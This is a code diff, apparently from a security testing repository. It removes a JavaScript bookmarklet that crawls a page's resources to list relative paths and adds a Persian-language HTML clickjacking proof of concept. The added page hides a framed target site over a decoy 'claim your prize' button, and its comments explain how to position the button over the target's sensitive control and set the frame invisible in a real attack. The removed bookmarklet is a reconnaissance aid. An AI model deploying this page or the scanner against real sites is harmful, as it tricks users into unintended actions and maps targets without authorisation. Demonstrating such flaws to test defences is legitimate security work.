@@ -1,1 +1,50 @@
-javascript:(async function(){let scanningDiv=document.createElement("div");scanningDiv.style.position="fixed",scanningDiv.style.bottom="0",scanningDiv.style.left="0",scanningDiv.style.width="100%",scanningDiv.style.maxHeight="50%",scanningDiv.style.overflowY="scroll",scanningDiv.style.backgroundColor="white",scanningDiv.style.color="black",scanningDiv.style.padding="10px",scanningDiv.style.zIndex="9999",scanningDiv.style.borderTop="2px solid black",scanningDiv.innerHTML="<h4>Scanning...</h4>",document.body.appendChild(scanningDiv);let e=[],t=new Set;async function n(e){try{const t=await fetch(e);return t.ok?await t.text():(console.error(`Failed to fetch ${e}: ${t.status}`),null)}catch(t){return console.error(`Error fetching ${e}:`,t),null}}function o(e){return(e.startsWith("/")||e.startsWith("./")||e.startsWith("../"))&&!e.includes(" ")&&!/[^\x20-\x7E]/.test(e)&&e.length>1&&e.length<200}function s(e){return[...e.matchAll(/['"]((?:\/|\.\.\/|\.\/)[^'"]+)['"]/g)].map(e=>e[1]).filter(o)}async function c(o){if(t.has(o))return;t.add(o),console.log(`Fetching and processing: ${o}`);const c=await n(o);if(c){const t=s(c);e.push(...t)}}const l=performance.getEntriesByType("resource").map(e=>e.name);console.log("Resources found:",l);for(const e of l)await c(e);const i=[...new Set(e)];console.log("Final list of unique paths:",i),console.log("All scanned resources:",Array.from(t)),scanningDiv.innerHTML=`<h4>Unique Paths Found:</h4><ul>${i.map(e=>`<li>${e}</li>`).join("")}</ul>`})();
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking PoC</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        /* دکمه یا لینک فریبنده در سایت مهاجم */
+        #decoy-button {
+            position: absolute;
+            top: 250px;  /* این عدد را طوری تنظیم کنید که دقیقاً روی دکمه حساس بیفتد */
+            left: 300px; /* این عدد را طوری تنظیم کنید که دقیقاً روی دکمه حساس بیفتد */
+            padding: 15px 30px;
+            background-color: #28a745;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1;
+        }
+        /* آی‌فریم حاوی صفحه هدف */
+        #target-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.3; /* برای تست 0.3 بگذارید تا هر دو لایه دیده شوند؛ در حمله واقعی 0.0 است */
+            z-index: 2;
+        }
+    </style>
+</head>
+<body>
+
+    <h3>اثبات آسیب‌پذیری Clickjacking</h3>
+    <p>در حمله واقعی، شفافیت صفحه هدف روی 0 تنظیم می‌شود و قربانی فقط دکمه سبز را می‌بیند.</p>
+
+    <!-- دکمه طعمه -->
+    <button id="decoy-button">برای دریافت جایزه کلیک کنید!</button>
+
+    <!-- آدرس صفحه هدف را اینجا قرار دهید -->
+    <iframe id="target-iframe" src="https://target-url.com"></iframe>
+
+</body>
+</html>
